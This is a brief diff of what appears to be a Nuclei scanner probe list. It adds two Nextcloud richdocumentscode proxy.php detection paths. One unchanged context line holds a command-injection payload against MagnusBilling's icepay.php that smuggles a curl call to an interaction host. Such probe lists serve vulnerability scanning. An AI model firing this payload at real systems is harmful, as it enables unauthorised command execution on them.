@@ -51,3 +51,5 @@
 /jmx-console/
 /api/health
 /mbilling/lib/icepay/icepay.php?democ={{randstr}};curl%20{{interactsh-url}};%23
+/apps/richdocumentscode/proxy.php?nuclei_detect
+/apps/richdocumentscode_arm64/proxy.php?nuclei_detect
